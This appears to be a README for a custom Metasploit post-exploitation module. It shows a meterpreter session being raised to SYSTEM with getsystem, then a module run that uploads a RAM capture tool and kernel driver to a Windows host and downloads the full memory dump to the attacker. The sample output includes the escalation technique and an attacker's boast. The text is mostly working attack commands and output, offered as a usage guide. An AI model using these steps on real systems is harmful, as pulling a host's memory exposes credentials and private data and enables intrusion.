# Metasploit Modules

## Utilization

After you got an meterpreter session run the command bellow If the script requires SYSTEM
```
meterpreter > getsystem
```

After that run the script, for example
```
meterpreter > run post/windows/gather/forensics/memorydump RAMCAPTURE_PATH="/tmp/Ram_Capturer/"
```

## Samples
```
meterpreter > getsystem 
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > run post/windows/gather/forensics/memorydump RAMCAPTURE_PATH="/tmp/Ram_Capturer/"


[*] Executing Dump of x64 architherure host
[!] Sending file, this may take some time...
[*] Uploading file C:\Users\helvio\AppData\Local\Temp\msvcp110.dll
[*] Uploading file C:\Users\helvio\AppData\Local\Temp\msvcr110.dll
[*] Uploading file C:\Users\helvio\AppData\Local\Temp\RamCapture64.exe
[*] Uploading file C:\Users\helvio\AppData\Local\Temp\ramcapturedriver.cat
[*] Uploading file C:\Users\helvio\AppData\Local\Temp\RamCaptureDriver64.sys
[*] Running RamCapture64.exe
[!] This may take some time...
.
[*] Downloading memory dump to /tmp/niYsAkm.vmem
[*] Downloading completed!
[+] 0wn3d by M4v3r1cK!
```

